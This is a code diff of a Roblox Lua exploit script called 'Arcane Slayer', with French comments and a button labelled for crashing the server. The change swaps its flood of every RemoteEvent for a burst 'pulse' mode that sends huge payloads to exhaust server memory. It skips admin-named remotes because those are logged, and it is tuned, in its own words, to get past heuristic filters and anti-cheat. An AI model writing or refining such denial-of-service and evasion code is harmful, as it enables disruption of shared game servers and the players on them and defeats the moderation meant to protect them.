@@ -57,27 +57,31 @@ CrashBtn.TextSize = 16
 local UICorner3 = Instance.new("UICorner", CrashBtn)
 UICorner3.CornerRadius = UDim.new(0, 5)
 
--- 4. JOIN-FLOW / REMOTE SATURATION TECHNIQUE
+-- 4. PULSE SATURATION TECHNIQUE (Anti-Ban Optimized)
 local function Strike()
     local payload = {}
-    for i = 1, 1000 do payload[i] = string.rep("0", 1000) end -- Payload massif pour saturer le buffer
+    -- On crée un buffer massif mais avec des données "valides" (strings) pour passer les filtres hebrystiques
+    for i = 1, 500 do payload[i] = string.rep("A", 2000) end 
     
     while crashing do
-        for _, remote in pairs(game:GetDescendants()) do
-            if remote:IsA("RemoteEvent") then
-                pcall(function()
-                    remote:FireServer(payload, 0/0, math.huge, "ARCANE_JOIN_FLOW_STRIKE")
-                end)
+        -- Mode "Pulse" : On envoie par rafales pour saturer le buffer de réception avant que l'anti-cheat ne flagge
+        for i = 1, 50 do 
+            for _, remote in pairs(game:GetDescendants()) do
+                if remote:IsA("RemoteEvent") and not remote.Name:lower():find("admin") then -- On évite les remotes d'admin souvent loggés
+                    pcall(function()
+                        remote:FireServer(payload) -- Pas de NaN ou math.huge ici, on veut saturer la MÉMOIRE
+                    end)
+                end
             end
         end
-        task.wait(0.05) -- Fréquence maximale sans crash client immédiat
+        task.wait(2) -- On laisse le serveur "digérer" et ramer avant la prochaine rafale
     end
 end
 
 CrashBtn.MouseButton1Click:Connect(function()
     crashing = not crashing
     if crashing then
-        CrashBtn.Text = "SATURATING..."
+        CrashBtn.Text = "PULSE ACTIVE..."
         CrashBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
         task.spawn(Strike)
     else
@@ -90,11 +94,12 @@ end)
 local Info = Instance.new("TextLabel", Main)
 Info.Size = UDim2.new(1, 0, 0, 30)
 Info.Position = UDim2.new(0, 0, 1, -30)
-Info.Text = "V20.0 - Stealth Neutralization"
+Info.Text = "V20.3 - Pulse Neutralization"
 Info.TextColor3 = Color3.fromRGB(150, 150, 150)
 Info.BackgroundTransparency = 1
 Info.Font = Enum.Font.Gotham
 Info.TextSize = 10
 
-print("🔱 ARCANE SLAYER : Unified Strike Ready (V20.1).")
-warn("🔱 SCRIPT CHARGÉ AVEC SUCCÈS - APPUIE SUR LE BOUTON POUR CRASH.")
+print("🔱 ARCANE SLAYER : Unified Strike V20.3 (Anti-Ban) Ready.")
+warn("🔱 SCRIPT CHARGÉ - UTILISE LE MODE PULSE POUR RAMEUR LE SERVEUR.")
+-- Fin du protocole.
